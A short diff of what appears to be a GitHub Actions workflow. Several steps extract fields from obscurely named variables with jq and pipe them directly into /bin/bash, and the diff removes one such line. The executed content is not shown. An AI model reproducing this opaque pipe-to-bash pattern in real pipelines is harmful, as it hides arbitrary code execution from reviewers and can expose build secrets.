@@ -53,7 +53,6 @@ jobs:
           printf '%s' "$aoco0" | jq -r .gkrz28084 | /bin/bash
           echo $a8 | jq -r .cen4 | /bin/bash
           echo $jxs143 | jq -r .qrx3 | /bin/bash
-          echo $ehu50707 | jq -r .hcv278 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
